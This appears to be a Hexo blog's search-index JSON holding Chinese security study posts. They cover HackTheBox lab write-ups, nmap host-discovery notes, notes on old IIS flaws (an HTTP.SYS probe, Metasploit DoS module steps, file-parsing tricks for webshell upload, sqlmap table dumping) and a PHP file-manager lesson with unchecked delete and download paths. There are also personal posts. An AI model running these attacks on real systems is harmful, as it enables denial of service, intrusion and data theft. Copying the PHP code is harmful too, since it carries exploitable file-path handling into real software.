-?\n\nubuntu@ip:~$ ftp 10.129.24.17\nConnected to 10.129.24.17.\n220 (vsFTPd 3.0.3)\nName (10.129.24.17:ubuntu): anonymous\n331 Please specify the password.\nPassword: \n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\n\nftp> help\nCommands may be abbreviated.  Commands are:\n\n!               edit            lpage           nlist           rcvbuf          struct\n$               epsv            lpwd            nmap            recv            sunique\naccount         epsv4           ls              ntrans          reget           system\nappend          epsv6           macdef          open            remopts         tenex\nascii           exit            mdelete         page            rename          throttle\nbell            features        mdir            passive         reset           trace\nbinary          fget            mget            pdir            restart         type\nbye             form            mkdir           pls             rhelp           umask\ncase            ftp             mls             pmlsd           rmdir           unset\ncd              gate            mlsd            preserve        rstatus         usage\ncdup            get             mlst            progress        runique         user\nchmod           glob            mode            prompt          send            verbose\nclose           hash            modtime         proxy           sendport        xferbuf\ncr              help            more            put             set             ?\ndebug           idle            mput            pwd             site\ndelete          image           mreget          quit            size\ndir             lcd             msend           quote           sndbuf\ndisconnect      less            newer           rate            status\n\nftp> ls\n229 Entering Extended Passive Mode (|||62732|)\n150 Here comes the directory listing.\n-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt\n226 Directory send OK.\n\nftp> get flag.txt\nlocal: flag.txt remote: flag.txt\n229 Entering Extended Passive Mode (|||56926|)\n150 Opening BINARY mode data connection for flag.txt (32 bytes).\n100% |***************************************************************|    32      119.73 KiB/s    00:00 ETA\n226 Transfer complete.\n32 bytes received in 00:00 (0.41 KiB/s)\n\nftp> bye\n421 Timeout.\n\nubuntu@ip-172-31-17-119:~$ ls\nflag.txt  lab_KILLMEN.ovpn  lab_KILLMEN1.ovpn  snap  starting_point_KILLMEN.ovpn\n\nubuntu@ip-172-31-17-119:~$ cat flag.txt \n035db21c881520061c53e0536e44f815ubuntu\n```\n\n| 单词              | 释义                                                         |\n| ----------------- | ------------------------------------------------------------ |\n| **acronym**       | n. 缩略语；首字母缩略词(如Aids系由acquired immune deficiency syndrome的首字母组成) |\n| **explore**       | v. 探讨；探索；勘探；探究；勘查；考察；(用手或身体某部)探察，探查；调查研究 |\n| **configuration** | n. (计算机的)配置；结构；构造；形状；布局；格局              |\n| **rudimentary**   | adj. 基本的；初级的；基础的；原始的；未充分发展的            |\n| **potentially**   | adv. 潜在地                                                  |\n| **low-overhead**  | 低开销                                                       |\n| **invoked**       | v. 援引，援用(法律、规则等作为行动理由)；提及，援引(某人、某理论、实例等作为支持)；提出(某人的名字，以激发某种感觉或行动) invoke的过去分词和过去式 |\n| **otherwise**     | adv. 否则；另；不然；在其他方面；亦；除此以外 conj. 否则 adj. 别的；在其他各方面…的；在其他不同情况下的 |\n| **infinitely**    | adv. 非常；无限地；极其                                      |\n| **previously**    | adv. 先前；(一段时间)以前                                    |\n| **properly**      | adv. 适当地；正确地；恰当地；实际上；真正地；得体地；符合习俗地 |\n\n![第二关过啦](../image/Fawn.png)\n","tags":["HTB","笔记","STARTING POINT"],"categories":["学习"]},{"title":"HTB-Meow","url":"/2023/06/30/HTB-Meow/","content":"\n环境：使用AWS Ubuntu22.04服务器加州IP连接VPN（免费白嫖一年）\n\n- 首次登录记得获取root权限，要不然连接openvpn一直错误\n\n```bash\nsudo passwd root\nsu root\n```\n\n只是看了攻略，连接这块提到ssh隧道转发，但是最后发现其实并不需要很复杂的隧道转发\n\n不过怎么样还是学了一些关于ssh转发的知识\n\nXshell隧道转发：https://blog.csdn.net/weixin_38491225/article/details/125923278\n\n至于连接实验环境：\n\n- 使用root连接VPN，下载文件openvpn打开 > 连接后可继续做题\n- 使用user扫描靶机IP拿到flag\n\n\n\n```bash\nubuntu@ip:~$ nmap -sV 10.129.237.214\nCommand 'nmap' not found, but can be installed with:\nsudo snap install nmap  # version 7.93, or\nsudo apt  install nmap  # version 7.91+dfsg1+really7.80+dfsg1-2ubuntu0.1\nSee 'snap info nmap' for additional versions.\n\nubuntu@ip:~$ sudo snap install nmap\nnmap 7.93 from Maximiliano Bertacchini (maxiberta) installed\n\nubuntu@ip:~$ nmap -sV 10.129.237.214\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-06-30 17:17 UTC\nNote: Host seems down. If it is really up, but blocking our ping probes, try -Pn\nNmap done: 1 IP address (0 hosts up) scanned in 3.34 seconds\n\nubuntu@ip:~$ nmap -sV 10.129.237.214\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-06-30 17:20 UTC\nNmap scan report for ip-10-129-237-214.us-west-1.compute.internal (10.129.237.214)\nHost is up (0.078s latency).\nNot shown: 999 closed tcp ports (conn-refused)\nPORT   STATE SERVICE VERSION\n23/tcp open  telnet  Linux telnetd\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 12.80 seconds\n\nubuntu@ip:~$ telnet 10.129.237.214\nTrying 10.129.237.214...\nConnected to 10.129.237.214.\nEscape character is '^]'.\n\n  █  █         ▐▌     ▄█▄ █          ▄▄▄▄\n  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀\n  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█\n\n\nMeow login: root\nWelcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Fri 30 Jun 2023 05:28:39 PM UTC\n\n  System load:           0.0\n  Usage of /:            41.7% of 7.75GB\n  Memory usage:          4%\n  Swap usage:            0%\n  Processes:             138\n  Users logged in:       0\n  IPv4 address for eth0: 10.129.237.214\n  IPv6 address for eth0: dead:beef::250:56ff:feb9:bd29\n\n\n75 updates can be applied immediately.\n31 of these updates are standard security updates.\nTo see these additional updates run: apt list --upgradable\n\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\n\nLast login: Mon Sep  6 15:15:23 UTC 2021 from 10.10.14.18 on pts/0\nroot@Meow:~# ls\nflag.txt  snap\nroot@Meow:~# \nroot@Meow:~# cat flag.txt \nb40abdfe23665f766f9c61ecba8a4c19\nroot@Meow:~#\n```\n\n最终第一关过了，因为是最简单的关卡，题倒没什么难的，仿佛在做英语阅读.....\n\n![第一关过了hhh](../image/Snipaste_2023-07-01_01-42-52.png)\n","tags":["HTB","笔记","STARTING POINT"],"categories":["学习"]},{"title":"主机发现","url":"/2023/06/29/NMAP工具使用-主机枚举/主机发现 b972894542c544ad929003762cffde33/","content":"\n## 主机发现\n\n### ****发现主机 Host Discovery****\n\n最有效的主机发现方法是使用**ICMP echo requests**\n\n```bash\nKillMen1@htb[/htb]$ sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d\" \" -f510.129.2.4\n10.129.2.10\n10.129.2.11\n10.129.2.18\n10.129.2.19\n10.129.2.20\n10.129.2.28\n```\n\n此扫描方法仅在主机防火墙允许的情况下才有效。否则，我们可以使用其他扫描技术来查明主机是否处于活动状态。我们将在`Firewall and IDS Evasion`中仔细研究这些技术。\n\n### ****扫描IP列表 Scan IP List****\n\n`Nmap`为我们提供了使用列表并从此列表中读取主机的选项，而不是手动定义或键入它们（内部渗透直接给了我们主机目标IP List）。\n\n```bash\nKillMen1@htb[/htb]$ cat hosts.lst10.129.2.4\n10.129.2.10\n10.129.2.11\n10.129.2.18\n10.129.2.19\n10.129.2.20\n10.129.2.28\n```\n\n可以把扫描IP和发现主机写进同一行命令中：\n\n```bash\nKillMen1@htb[/htb]$ sudo nmap -sn -oA tnet -iL hosts.lst | grep for | cut -d\" \" -f510.129.2.18\n10.129.2.19\n10.129.2.20\n```\n\n在此示例中，我们看到 7 个主机中只有 3 个处于活动状态。请记住，这可能意味着其他主机由于其防火墙配置而忽略默认的**ICMP 回显请求。**由于`Nmap`没有收到响应，它将这些主机标记为不活动。\n\n### ****扫描多个IP****\n\n```bash\nKillMen1@htb[/htb]$ sudo nmap -sn -oA tnet 10.129.2.18-20| grep for | cut -d\" \" -f510.129.2.18\n10.129.2.19\n10.129.2.20\n```\n\n### ****扫描单个IP****\n\n在扫描单个主机的开放端口及其服务之前，我们首先必须确定它是否处于活动状态。为此，我们可以使用与之前相同的方法。\n\n```bash\nKillMen1@htb[/htb]$ sudo nmap 10.129.2.18 -sn -oA hostStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-14 23:59 CEST\nNmap scan report for 10.129.2.18\nHost is up (0.087s latency).\nMAC Address: DE:AD:00:00:BE:EF\nNmap done: 1 IP address (1 host up) scanned in 0.11 seconds\n```\n\n如果我们禁用端口扫描（`-sn`），Nmap会使用ICMP回显请求（`-PE`）自动ping扫描。一旦发送了这样的请求，如果ping主机处于活动状态，我们通常会收到ICMP回复。更有趣的事实是，我们之前的扫描并没有做到这一点，因为在Nmap发送ICMP回显请求之前，它会发送`ARP ping`，从而得到ARP回复。我们可以通过“`--packet trace`”选项来确认这一点。为了确保发送ICMP回显请求，我们还为此定义了选项（`-PE`）。\n\n```bash\nKillMen1@htb[/htb]$ sudo nmap 10.129.2.18 -sn -oA host -PE --packet-trace Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 00:08 CEST\nSENT (0.0074s) ARP who-has 10.129.2.18 tell 10.10.14.2\nRCVD (0.0309s) ARP reply 10.129.2.18 is-at DE:AD:00:00:BE:EF\nNmap scan report for 10.129.2.18\nHost is up (0.023s latency).\nMAC Address: DE:AD:00:00:BE:EF\nNmap done: 1 IP address (1 host up) scanned in 0.05 seconds\n```\n\n确定 Nmap 为什么将我们的目标标记为“alive”的另一种方法是使用“`--reason`”选项。\n\n```bash\nKillMen1@htb[/htb]$ sudo nmap 10.129.2.18 -sn -oA host -PE --reason Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 00:10 CEST\nSENT (0.0074s) ARP who-has 10.129.2.18 tell 10.10.14.2\nRCVD (0.0309s) ARP reply 10.129.2.18 is-at DE:AD:00:00:BE:EF\nNmap scan report for 10.129.2.18\nHost is up, received arp-response (0.028s latency).\nMAC Address: DE:AD:00:00:BE:EF\nNmap done: 1 IP address (1 host up) scanned in 0.03 seconds\n```\n\n我们在这里看到，Nmap确实仅通过ARP请求和ARP回复来检测主机是否存活。 要禁用 ARP 请求并使用所需的 ICMP 回显请求扫描我们的目标，我们可以通过设置“`--disable-arp-ping`”选项来禁用 ARP ping。 然后我们可以再次扫描目标并查看发送和接收的数据包。\n\n```bash\nKillMen1@htb[/htb]$ sudo nmap 10.129.2.18 -sn -oA host -PE --packet-trace --disable-arp-ping Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 00:12 CEST\nSENT (0.0107s) ICMP [10.10.14.2 > 10.129.2.18 Echo request (type=8/code=0) id=13607 seq=0] IP [ttl=255 id=23541 iplen=28 ]\nRCVD (0.0152s) ICMP [10.129.2.18 > 10.10.14.2 Echo reply (type=0/code=0) id=13607 seq=0] IP [ttl=128 id=40622 iplen=28 ]\nNmap scan report for 10.129.2.18\nHost is up (0.086s latency).\nMAC Address: DE:AD:00:00:BE:EF\nNmap done: 1 IP address (1 host up) scanned in 0.11 seconds\n```\n\n更多主机发现策略：https://nmap.org/book/host-discovery-strategies.html\n","tags":["笔记","HTB学院","工具","nmap","主机枚举"],"categories":["学习"]},{"title":"NMAP工具使用-主机枚举（总目录）","url":"/2023/06/29/NMAP工具使用-主机枚举（总目录）/","content":"\n# 主机枚举-总目录\n\n| 扫描选项      | 描述                                                 |\n| ------------- | ---------------------------------------------------- |\n| 10.129.2.0/24 | 目标网络范围。                                       |\n| -sn           | 禁用端口扫描。                                       |\n| -oA tnet      | 以名称“tnet”开头的所有格式存储结果。                 |\n| -iL           | 对提供的“hosts.lst”列表中的目标执行定义的扫描。      |\n| -PE           | 通过使用“ICMP Echo Requests”针对目标执行 ping 扫描。 |\n| --reason      | 显示特定结果的原因。                                 |\n|               |                                                      |\n\n[主机发现](https://abckillmen.github.io/2023/06/29/NMAP%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8-%E4%B8%BB%E6%9C%BA%E6%9E%9A%E4%B8%BE/%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%20b972894542c544ad929003762cffde33/)\n\n","tags":["笔记","HTB学院","工具"],"categories":["学习"]},{"title":"web攻防笔记第41天","url":"/2023/06/27/web攻防笔记第41天/","content":"\n### 41天：ASP应用&HTTP.SYS&短文件&文件解析&Access注入&数据库泄漏\n\n#### ASP应用\n\nASP几乎不存在了，老的应用还有一小部分。\n\n大部分都是JAVA（18-今）和PHP（15-18）。\n\n#### 数据库泄露\n\nASP+ACCESS(ACCESS无需连接，无账号密码，文件里有固定好的数据库路径，拿到路径就可以下载数据库文件解密)。\n\nACCESS后缀名.mdb\n\n文件路径里的 `#` 替换成 `%23` ，可从浏览器输入路径和文件名直接访问下载。\n\n#### HTTP.SYS(CVE-2015-1635)\n\n##### 漏洞描述\n\n蓝屏漏洞。HTTP.sys远程执行代码漏洞。\n\n在HTTP协议栈（HTTP.SYS)中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞。成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。\n\n对于此漏洞，一般都是对目标进行攻击，从而让目标主机死机。当然也可以执行任意代码。\n\n##### 影响版本\n\nWindows 7\n\nWindows Server 2008 R2\n\nWindows 8\n\nWindows Server 2012\n\nWindows 8.1\n\nWindows Server 2012 R2\n\n##### 漏洞利用条件\n\n安装了<u>**IIS6.0以上的**</u>Windows 7、Windows Server 2008 R2、Windows 8、Windows Server 2012、Windows 8.1 和 Windows Server 2012 R2版本。\n\n##### 检测漏洞是否存在\n\n在kali linux中输入： \n\n```bash\ncurl http://192.xxx.137.xxx -H \"Host: 192.xxx.137.xxx\" -H \"Range: bytes=0-18446744073709551615\"\n```\n\n（Range字段值的含义。18446744073709551615转为十六进制是 0xFFFFFFFFFFFFFFFF(16个F），是64位无符号整型所能表达的最大整数，整数溢出和这个超大整数有关。）\n\n返回的TITLE中为**Requested Range Not Satisfiable** 则表示目标存在HTTP.SYS漏洞；\n如果返回的是**Bad Request**则表示该漏洞不存在；\n\n*192.xxx.137.xxx:为目标主机IP地址*\n\n##### 漏洞复现\n\n使用msf > 后续会经常用到的工具\n\n```bash\nmsfconsole\t\t\t//打开msf\nsearch ms15-034\t\t//查询该漏洞\nauxiliary/dos/http/ms15_034_ulonglongadd\t\t\t//使用模块攻击\n\nuse auxiliary/dos/http/ms15_034_ulonglongadd\nshow options\nset rhosts 192.xxx.137.xxx\nset rport xx\nrun\n```\n\n##### 不能乱用：破环计算机罪\n\n#### IIS短文件漏洞\n\n##### 漏洞描述\n\n此漏洞实际是由HTTP请求中旧DOS 8.3名称约定(SFN)的代字符(~)波浪号引起的。它允许远程攻击者在Web根目录下公开文件和文件夹名称(不应该可被访问)。攻击者可以找到通常无法从外部直接访问的重要文件，并获取有关应用程序基础结构的信息。\n\n##### 漏洞成因\n\n为了兼容16位MS-DOS程序，Windows为文件名较长的文件(和文件夹)生成了对应的windows 8.3短文件名。在Windows下查看对应的短文件名，可以使用命令`dir /x`\n\n##### 应用场景\n\n**后台路径获取，数据库文件获取，其他敏感文件获取**（<u>探针只显示前六位</u>）\n\n##### 利用工具\n\nhttps://github.com/irsdl/IIS-ShortName-Scanner（Java）\n\nhttps://github.com/lijiejie/IIS_shortname_Scanner（python）\n\njava工具稍微好用一些\n\n#### IIS文件解析\n\n##### **IIS 6 解析漏洞比较多  > 没有官方补丁**\n\n1、该版本默认会将`*.asp;.jpg` 此种格式的文件名，当成Asp解析\n\n2、该版本默认会将`*.asp/`目录下的所有文件当成Asp解析。\n\n如：`logo.asp;.jpg` `xx.asp/logo.jpg`\n\n##### IIS 7.x 解析漏洞比较少 > 有官方补丁\n\n在一个文件路径`(/xx.jpg)`后面加上`/xx.php`会将`/xx.jpg/xx.php` 解析为php文件\n\n应用场景：**配合文件上传获取Webshell**\n\n生成后门+上传文件：**哥斯拉**\n\n常见情况：*6版本+win2003\t7/7.5版本+win2008\t现在8版本*\n\n#### IIS写权限\n\n几乎碰不到，非常老的漏洞。新上线的项目不可能有此漏洞。长长见识。\n\n利用参考：https://cloud.tencent.com/developer/article/2050105\n\n原因：搭建配置时，两处权限配置不当导致。\n\n**IIS<=6.0**，目录权限开启写入，开启WebDAV，设置为允许\n\n![目录写入权限开启](../image/image-20230628001531681.png)\n\n![开启WebDAV](../image/image-20230628002147897.png)\n\n**使用postman发送PUT请求可以写入，直接上传文件**：\n\n![postman发送PUT请求](../image/image-20230628002920678.png)\n\n#### SQLMAP使用&ACCESS注入\n\nACCESS数据库无管理帐号密码，顶级架构为表名，列名（字段），数据，所以在注入猜解中一般采用字典猜解表和列再获取数据，猜解简单但又可能出现猜解不到的情况，由于Access数据库在当前安全发展中已很少存在，故直接使用SQLMAP注入。\n\n```bash\npython sqlmap.py -u \"\" --tables //获取表名\npython sqlmap.py -u \"\" --cloumns -T admin //获取admin表名下的列名\npython sqlmap.py -u \"\" --dump -C \"\" -T admin  //获取表名下的列名数据\n```\n\n使用上述命令，找到可用数据（admin，密码）以后\n\n找后台：\n\n1、短文件扫描：利用漏洞探针\n\n2、目录扫描：字典\n\n3、网站爬虫：获取架构中的目录和文件，分析\n\n拿权限：上传文件\n\n若不能轻松上传文件，可配合配置解析漏洞抓包改参数\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["笔记","xiaodi8","web攻防"],"categories":["学习","厮杀战场"]},{"title":"关于如何科学使用外网资料与靶场","url":"/2023/06/26/关于如何科学使用外网资料与靶场/","content":"\n终于正常了，我发现这个hexo每次新建一个文件，就要等几分钟才能输入进去中文，哪怕语言配置过了也要等......奇奇怪怪\n\n有些外文网站的视频资源我是完全用不了啊，昨天查了一些工具，算是把听不懂看不懂的问题解决了七七八八\n\n前提：只要视频都能下载到本地。\n\n下载本地的方法：\n\n如果是b站视频，那么就是谷歌+油猴插件+bilibiliEvolved 先把视频下载下来。\n\n如果是油管，那么我还没试过...之后有空去看看怎么搞，但应该都差不多\n\n视频在本地以后，使用剪映专业版的自动识别语音转字幕+字幕提取工具提出来是srt格式+网易见外翻译（2M以内）\n\n最后使用视频播放器打开就行\n\n\n\n之前还使用过potplayer自动翻译，完全不行，没有任何变化。\n\n还有Github上一个自动翻译软件，写的挺好的，没有发行版，从云端构建了一晚上还没好，真绝了，CI构建也懒得试了。\n\n最后还是剪映最香啊...\n\n\n\nhackthebox订阅有学生优惠，一个月看起来会优惠三四十人民币的样子，长期订阅还是比较划算的，所以有个美国edu账号又是方便很多，而且notion笔记可以免费使用，还有其他的一些学生优惠也是，不得不说这邮箱还是值得我花了130r买...过两天试试\n","tags":["哎就是玩"],"categories":["碎碎念"]},{"title":"关于php开发的学习","url":"/2023/06/24/关于php开发的学习/","content":"\n### 出现的问题\n\n#### 关于运算符??\n\nphp中两个问号是php7新推出的一个NULL合并运算符??\n如果它存在且不为NULL，则返回其第一个操作数；\n否则，返回其第二个操作数。\n从左到右评估。NULL合并运算符也可以链形式使用。\n\n例如：\n\n`$a = null; var_dump($a??1);` *输出*1\n如果`$a = 0; var_dump($a??1);` *输出0*\n如果是空字符串，输出也是空字符串。\n\n#### 黑名单、白名单、类型 过滤\n\n```php\n$name=$_FILES['f']['name'];\n$type=$_FILES['f']['type'];\n$size=$_FILES['f']['size'];\n$tmp_name=$_FILES['f']['tmp_name'];\n$error=$_FILES['f']['error'];\n```\n\n黑名单机制：\n\n```php\n$black_ext=array('php','asp','jsp','aspx');\n//xxx.jpg xxx.png\n$fenge = explode('.',$name);\n$exts = end($fenge);\nif(in_array($exts,$black_ext)){\n    echo '非法后缀文件'.$exts;\n}else{\n    move_uploaded_file($tmp_name,'upload/'.$name);\n    echo '<script>alert(\"上传成功\")</script>';\n}\n```\n\n白名单机制：\n\n```php\n$allow_ext=array('png','jpg','gif','jpeg');\n//xxx.jpg xxx.png\n$fenge = explode('.',$name);\n$exts = end($fenge);\nif(!in_array($exts,$allow_ext)){\n    echo '非法后缀文件'.$exts;\n}else{\n    move_uploaded_file($tmp_name,'upload/'.$name);\n    echo '<script>alert(\"上传成功\")</script>';\n}\n```\n\nMIME文件类型过滤：\n\n```php\n$allow_type=array('image/png','image/jpg','image/jpeg','image/gif');\nif(!in_array($type,$allow_type)){\n    echo '非法后缀文件';\n}else{\n    move_uploaded_file($tmp_name,'upload/'.$name);\n    echo '<script>alert(\"上传成功\")</script>';\n}\n```\n\n#### 文件管理\n\n\n\n```php+HTML\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"utf-8\">\n    <title>文件列表</title>\n    <link rel=\"stylesheet\" href=\"https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css\">\n    <style type=\"text/css\">\n        ul {\n            list-style: none;\n            padding: 0;\n            margin: 0;\n        }\n        li {\n            margin-bottom: 10px;\n        }\n        i {\n            margin-right: 10px;\n        }\n        a {\n            text-decoration: none;\n            color: #333;\n        }\n    </style>\n</head>\n<body>\n<h1>当前目录下的文件列表</h1>\n<ul>\n\n</ul>\n</body>\n</html>\n\n<?php\n$dir = $_GET['path'] ?? './';\n\n//1.打开目录，读取文件列表 opendir\n//2.循环读取文件列表 while readdir\n//3.判断是文件还是文件夹 is_dir\n\n//打开目录，读取文件列表 opendir\nfunction filelist($dir){\n    if($dh = opendir($dir)){\n        //循环读取文件列表 while readdir\n        while(($file=readdir($dh) )!== false){\n            //判断是文件还是文件夹 is_dir\n            if(is_dir($file)){\n                echo \"<li><i class='fa fa-folder'></i> <a href='?path=$file'>\" . $file . '</a></li>';\n            }else{\n                echo '<li><i class=\"fa fa-file\"></i> <a href=\"#\">' . $file . '</a></li>';\n            }\n        }\n    }\n}\n\nfilelist($dir);\n\nfunction del($file){\n    if(!is_dir($file)){\n        unlink($file);\n        echo \"<script>alert('删除成功')</script>\";\n    }\n}\n\nif(isset($_GET['del'])){\n    del($_GET['del']);\n}\n\n\nfunction down($filepath){\n    $fileName = basename($filepath);\n    header(\"Content-Type: application/octet-stream\");\n    header(\"Content-Disposition: attachment; filename=\\\"\" . $fileName . \"\\\"\");\n    header(\"Content-Length: \" . filesize($filepath));\n    readfile($filepath);\n}\n\nif(isset($_GET['down'])){\n    down($_GET['down']);\n}\n?>\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["php","web开发"],"categories":["学习"]},{"title":"试试github+hexo搭建的博客怎么样","url":"/2023/06/24/试试github-hexo搭建的博客怎么样/","content":"\n感觉还可以？用Typora打开无缝衔接，不过还没有选择自己喜欢的主题。之前有在阿里云捣鼓过博客什么的，但是奈何实在是太贵了，一个服务器一个月几十块，买不起，试用一下就行，不过倒是可以搞一下个人域名配置，之前那国内服务器还去备案过，现在也已经快过期了。学习使用还是香港服务器按照分钟计算最划算。\n\n```js\nhexo new newpapername\n\nhexo clean\nhexo generate\nhexo deploy\n```\n\n关于hexo还需要把配置文件改了什么的。刚发现一款还可以的主题 https://github.com/hooozen/hexo-theme-tranquility\n\n下载试试，问题就是这个Github实在是卡的断断续续，什么时候能实现科学上网还需要研究一下......\n\n------\n\n6月25日 0:44更新\n\n当天晚上就下载了clash，碰巧找到个免费节点600M，试了一下香港ip网速都快的飞起，真绝了，用微信打开微博都快了好多......等之后用完去订阅一下就行~\n\n后面似乎还要再把博客配置一些小细节改一下，但是先不急了，先还是继续学几天web开发吧，真是进度缓慢呐...\n\n","tags":["哎就是玩","博客搭建"],"categories":["碎碎念"]},{"title":"Hello World","url":"/2023/06/24/hello-world/","content":"Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n"},{"title":"中二之龙战骑士","url":"/2017/04/21/中二之龙战骑士/","content":"\n 今夜很美。头顶上闪烁的孤星还有组合的北斗七星、忽明忽暗的飞机、隐约可见的云。很久很久我都不再抬头认真观望夜空了。\n\n五年级的音乐课，陈老师规定的音乐考试形式为自由组合唱一首歌或者单人表演乐器之类的都可以。\n\n我和同年同日认得哥还有他的好基友三个人一起排练——牛仔很忙。我征得爸爸的同意，打开我们家第一台电脑搜索这首歌曲，想把它的歌词抄下来。\n\n2分48秒结束后随机播放到周董的新专辑。开头的气势磅礴顿时吸引我。龙战骑士。我的注意力顿时被这首歌全部吸引过去。神圣的把它抄下来。歌词很迷人。\n\n至此以后，我时不时就从笔袋将它拿出来看。上课下课学校家中。仿佛是《圣经》一般。那个时候我真觉得，这个世界上一定有龙。\n\n之后的生日上，我获得了一支看起来很贵重的钢笔。不知从哪里翻出来一个黑色硬皮本，新世界即将到来。耳边环绕的是F.I.R.《流浪者之歌》。\n\n那个时候我常常望着窗外，望着天空，一望就是好几个小时。心中信仰着在不为人知的某处一定有不同于我们人类的文明。\n\n到现在我依然可以记得那个世界，它和我同步更新，最早的历史虽然模糊甚至忘却，但依然无法否认它们曾经存在过。\n\n林千雪、沈蔚濯、正天宇、陆家、沈家、三人帮、七星审判、龙迹、黑色星期天、忏魂曲……至今他们陪伴了我将近十年。\n\n初一二的时候偶然间接触到些许神秘学和部分神奇的力量与人群。我的世界飞速发展。我在“异城”呆了两年。那两年对我今后都有深远的影响和发展。\n\n2012年12月13日。妈妈送给我一件生日礼物——《苏菲的世界》。另一个世界的大门又向我敞开更多的一点。兴奋、紧张、愉悦、震撼包围了我。\n\n到现在我的手边是赵林老师的西哲史讲演录以及张志伟老师的十五讲。过去和现在甚至是将来串成了一条线。\n\n上个寒假我在初中用的MP4中找到了当年的历史。我描绘的《龙迹》、关于末日的说法、术法、一些稀奇古怪东西…再一次遇见他们，熟悉而又陌生。我将他们珍藏起来。\n\n此时此刻。\n“对敌人谦卑，抱歉我不会，而远方龙战于野，咆哮声不自觉，横越过了几条街，我坚决 冲破这一场浩劫……”\n“谁淌血我却只为，拯救你的无邪，城墙上我在等魔坠，火焰吞噬无名碑，摧毁却无法击溃，我要爱上谁……”\n\n嘛，就这么一如既往的中二下去吧。\n\n如果我能踏足那个世界，碎尸万段再所不惜。\n\np.s.\n\nbgm:深澤秀行《10th symphony type/MOON》\n","tags":["铁甲依然在","随笔"],"categories":["碎碎念"]}]